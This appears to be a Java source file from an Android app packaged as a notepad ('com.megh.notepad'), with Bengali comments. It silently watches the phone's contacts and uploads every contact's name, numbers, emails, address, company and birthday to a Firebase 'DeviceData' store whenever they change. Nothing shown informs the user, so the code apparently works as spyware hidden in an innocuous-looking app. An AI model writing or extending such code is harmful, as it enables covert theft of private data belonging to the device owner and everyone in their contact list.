package com.megh.notepad; // আপনার প্যাকেজের নাম দিন

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class ContactHelper {

    private static ContentObserver contactObserver;
    // 🌟 নতুন: একসাথে ডাবল সিঙ্ক যেন না হয় তার জন্য একটি লক 🌟
    private static boolean isSyncing = false; 

    public static void startMonitoring(final Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.e("ContactHelper", "READ_CONTACTS permission denied!");
            return;
        }

        if (contactObserver == null) {
            contactObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange) {
                    super.onChange(selfChange);
                    Log.d("ContactHelper", "Contacts changed! Syncing...");
                    syncContacts(context);
                }
            };

            context.getContentResolver().registerContentObserver(
                    ContactsContract.Contacts.CONTENT_URI, true, contactObserver);
            
            syncContacts(context);
        }
    }

    public static void stopMonitoring(Context context) {
        if (contactObserver != null) {
            context.getContentResolver().unregisterContentObserver(contactObserver);
            contactObserver = null;
        }
    }

    private static void syncContacts(final Context context) {
        if (isSyncing) return; // ইতিমধ্যে কাজ চললে নতুন করে শুরু করবে না
        isSyncing = true;

        // 🌟 ফিক্স ১: মেইন থ্রেড ব্লক এড়াতে ব্যাকগ্রাউন্ড থ্রেড ব্যবহার করা হলো 🌟
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                        return;
                    }

                    DatabaseReference dbRef = FirebaseDatabase.getInstance()
                            .getReference("DeviceData").child(BackgroundService.USER_ID).child("Contacts");

                    android.net.Uri uri = ContactsContract.Data.CONTENT_URI;
                    String[] projection = new String[]{
                            ContactsContract.Data.CONTACT_ID,
                            ContactsContract.Data.DISPLAY_NAME,
                            ContactsContract.Data.MIMETYPE,
                            ContactsContract.Data.DATA1, 
                            ContactsContract.Data.DATA2,  
                            ContactsContract.Data.CONTACT_LAST_UPDATED_TIMESTAMP 
                    };

                    Cursor cursor = context.getContentResolver().query(uri, projection, null, null, ContactsContract.Data.CONTACT_ID + " ASC");
                    Map<String, Map<String, Object>> allContactsMap = new HashMap<>();

                    if (cursor != null && cursor.moveToFirst()) {
                        int idIndex = cursor.getColumnIndex(ContactsContract.Data.CONTACT_ID);
                        int nameIndex = cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME);
                        int mimeIndex = cursor.getColumnIndex(ContactsContract.Data.MIMETYPE);
                        int data1Index = cursor.getColumnIndex(ContactsContract.Data.DATA1);
                        int data2Index = cursor.getColumnIndex(ContactsContract.Data.DATA2);
                        int timeIndex = cursor.getColumnIndex(ContactsContract.Data.CONTACT_LAST_UPDATED_TIMESTAMP);

                        do {
                            String contactId = cursor.getString(idIndex);
                            String name = cursor.getString(nameIndex);
                            String mimeType = cursor.getString(mimeIndex);
                            String data1 = cursor.getString(data1Index);
                            String data2 = cursor.getString(data2Index);
                            long timestamp = cursor.getLong(timeIndex);

                            if (name == null) name = "Unknown";
                            String fbKey = "ContactID_" + contactId;

                            if (!allContactsMap.containsKey(fbKey)) {
                                Map<String, Object> newContact = new HashMap<>();
                                newContact.put("Name", name);
                                newContact.put("Number", ""); 
                                newContact.put("Emails", "");
                                newContact.put("Address", "");
                                newContact.put("Company", "");
                                newContact.put("DOB", "");
                                newContact.put("PrimaryNumber", "");
                                
                                if (timestamp > 0) {
                                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("dd/MM/yyyy hh:mm a", java.util.Locale.getDefault());
                                    newContact.put("Last_Saved", sdf.format(new java.util.Date(timestamp)));
                                } else {
                                    newContact.put("Last_Saved", "Unknown");
                                }
                                allContactsMap.put(fbKey, newContact);
                            }

                            Map<String, Object> currentContact = allContactsMap.get(fbKey);

                            if (data1 != null && !data1.isEmpty()) {
                                switch (mimeType) {
                                    case ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE:
                                        String existingNumbers = (String) currentContact.get("Number");
                                        currentContact.put("Number", existingNumbers.isEmpty() ? data1 : existingNumbers + ", " + data1);
                                        
                                        if (((String) currentContact.get("PrimaryNumber")).isEmpty()) {
                                            currentContact.put("PrimaryNumber", data1);
                                        }
                                        break;
                                    case ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE:
                                        String emails = (String) currentContact.get("Emails");
                                        currentContact.put("Emails", emails.isEmpty() ? data1 : emails + ", " + data1);
                                        break;
                                    case ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE:
                                        currentContact.put("Address", data1);
                                        break;
                                    case ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE:
                                        currentContact.put("Company", data1);
                                        break;
                                    case ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE:
                                        if (data2 != null && data2.equals(String.valueOf(ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY))) {
                                            currentContact.put("DOB", data1);
                                        }
                                        break;
                                }
                            }
                        } while (cursor.moveToNext());
                        cursor.close();

                        // 🌟 ফিক্স ২: ফায়ারবেস স্প্যামিং রোধে ব্যাচ (Batch) আপলোড লজিক 🌟
                        Map<String, Object> batchUpdateMap = new HashMap<>();
                        int syncedCount = 0;

                        for (Map.Entry<String, Map<String, Object>> entry : allContactsMap.entrySet()) {
                            Map<String, Object> contactData = entry.getValue();
                            String primaryNumber = (String) contactData.get("PrimaryNumber");
                            
                            contactData.remove("PrimaryNumber");
                            
                            if (primaryNumber != null && !primaryNumber.trim().isEmpty()) {
                                String firebaseKey = primaryNumber.replaceAll("[^0-9+]", "");
                                if (!firebaseKey.isEmpty()) {
                                    // ফায়ারবেসে একসাথে পাঠানোর জন্য ম্যাপে যুক্ত করা হচ্ছে
                                    batchUpdateMap.put(firebaseKey, contactData);
                                    syncedCount++;
                                }
                            }

                            // যদি ইউজারের ৫০০০+ কন্টাক্ট থাকে, তাহলে ৫০০ করে ভাগ করে পাঠানো হবে (Chunking)
                            if (batchUpdateMap.size() >= 500) {
                                dbRef.updateChildren(batchUpdateMap);
                                batchUpdateMap.clear(); // পাঠানোর পর ম্যাপ খালি করে দেওয়া
                            }
                        }

                        // লুপ শেষে যদি কিছু কন্টাক্ট বাকি থাকে (যেমন ৩২০ টা), সেগুলো পাঠানো
                        if (!batchUpdateMap.isEmpty()) {
                            dbRef.updateChildren(batchUpdateMap);
                        }
                        
                        Log.d("ContactHelper", "Contacts synced successfully using Batch Upload! Total: " + syncedCount);
                    }
                } catch (Exception e) {
                    Log.e("ContactHelper", "Error: " + e.getMessage());
                } finally {
                    isSyncing = false; // কাজ শেষে লক আনলক করে দেওয়া হলো
                }
            }
        }).start(); // থ্রেড স্টার্ট
    }
}

